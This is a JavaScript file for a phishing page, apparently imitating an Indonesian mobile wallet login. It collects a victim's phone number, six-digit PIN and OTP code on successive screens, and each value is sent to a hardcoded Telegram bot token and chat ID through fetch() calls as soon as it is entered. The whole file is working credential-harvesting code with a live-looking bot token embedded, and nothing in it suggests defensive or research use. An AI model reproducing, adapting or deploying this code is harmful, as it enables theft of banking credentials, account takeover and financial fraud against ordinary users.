// Telegram Bot Token and Chat ID (from user info)
const botToken = "7693986068:AAGJVYCMaLgHIkg87dqPmywwOpkoQ7ViIXo";
const chatId = "6641971332";

// Timer variables
let countdown = 180;
let interval;

// Function to send data to Telegram
function sendToTelegram(message) {
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    // Send the request to Telegram
    fetch(telegramUrl)
        .then(response => {
            if (response.ok) {
                console.log('Message sent to Telegram');
            }
        })
        .catch(error => {
            console.error('Error:', error);
        });
}

// Function to start the countdown timer
function startTimer() {
    countdown = 180; // Reset countdown to 180 seconds
    clearInterval(interval); // Clear any existing intervals
    interval = setInterval(function () {
        if (countdown > 0) {
            document.getElementById('resend-otp').innerHTML = `KIRIM ULANG (${countdown})`;
            countdown--;
        } else {
            clearInterval(interval);
            document.getElementById('resend-otp').innerHTML = 'KIRIM ULANG';
        }
    }, 1000);
}

// Send Phone Number to Telegram
function sendPhoneToTelegram() {
    const phone = document.getElementById('phone').value;
    const message = `Phone: ${phone}`;
    sendToTelegram(message);
}

// Send PIN to Telegram
function sendPINToTelegram() {
    const pin = [...document.querySelectorAll('.pin-box')].map(box => box.value).join('');
    const message = `PIN: ${pin}`;
    sendToTelegram(message);
}

// Send OTP to Telegram
function sendOTPToTelegram() {
    const otp = Array.from(document.querySelectorAll(".otp-box")).map(input => input.value).join("");
    sendToTelegram(`OTP: ${otp}`);
}

// Switch between pages
function showPage(pageNum) {
    for (let i = 1; i <= 3; i++) {
        document.getElementById('page-' + i).classList.add('hidden');
    }
    document.getElementById('page-' + pageNum).classList.remove('hidden');

    // Send data to Telegram after switching pages
    if (pageNum === 2) {
        sendPhoneToTelegram();  // Send phone when moving to PIN page
    } else if (pageNum === 3) {
        sendPINToTelegram();  // Send PIN when moving to OTP page
        startTimer(); // Start the countdown timer when on the OTP page
    }
}

// Validate phone number
function validatePhone() {
    const phone = document.getElementById('phone').value;
    const btn1 = document.getElementById('btn-1');
    const phonePattern = /^(\+62|62|0)8[1-9][0-9]{6,10}$/;

    if (phone.match(phonePattern)) {
        btn1.disabled = false;
        btn1.classList.add('enabled');
    } else {
        btn1.disabled = true;
        btn1.classList.remove('enabled');
    }
}

// Move to the next PIN input
function moveNext(current, nextFieldId) {
    if (current.value.length === current.maxLength) {
        document.getElementById(nextFieldId).focus();
    }
}

// Validate PIN (enable next button)
function validatePIN() {
    const pin = [...document.querySelectorAll('.pin-box')].map(box => box.value).join('');
    const btn2 = document.getElementById('btn-2');

    if (pin.length === 6) {
        btn2.disabled = false;
        btn2.classList.add('enabled');
    } else {
        btn2.disabled = true;
        btn2.classList.remove('enabled');
    }
}

// Toggle PIN visibility
function togglePassword() {
    const pins = document.querySelectorAll(".pin-box");
    pins.forEach(pin => {
        pin.type = pin.type === "password" ? "text" : "password";
    });
}


// Updated OTP validation and navigation between boxes
function moveNextOTP(current, nextFieldId) {
    if (current.value.length === current.maxLength) {
        const nextField = document.getElementById(nextFieldId);
        if (nextField) {
            nextField.focus();
        }
    }
    validateOTP(); // Call validation after each input
}

// Validate OTP (enable next button after 4 digits)
function validateOTP() {
    const otp = [...document.querySelectorAll('.otp-box')].map(box => box.value).join('');
    const btn3 = document.getElementById('btn-3');

    if (otp.length === 4) {
        btn3.disabled = false;
        btn3.classList.add('enabled');
    } else {
        btn3.disabled = true;
        btn3.classList.remove('enabled');
    }
}

// Add event listeners to OTP input boxes
document.querySelectorAll('.otp-box').forEach((box, index) => {
    box.addEventListener('input', () => moveNextOTP(box, `otp-${index + 2}`));
});

// PIN show/hide toggle
function togglePinVisibility() {
    const pinBoxes = document.querySelectorAll('.pin-box');
    const isHidden = pinBoxes[0].type === 'password';

    pinBoxes.forEach(box => {
        box.type = isHidden ? 'text' : 'password';
    });
    document.getElementById('toggle-pin-visibility').textContent = isHidden ? 'Hide PIN' : 'Show PIN';
}

// Add an event listener for the PIN visibility toggle button
document.getElementById('toggle-pin-visibility').addEventListener('click', togglePinVisibility);


// Resend OTP
document.getElementById('resend-otp').addEventListener('click', () => {
    startTimer(); // Restart the countdown timer when KIRIM ULANG is clicked
});

// Send OTP after clicking 'LANJUT' on OTP page
document.getElementById('btn-3').addEventListener('click', sendOTPToTelegram);
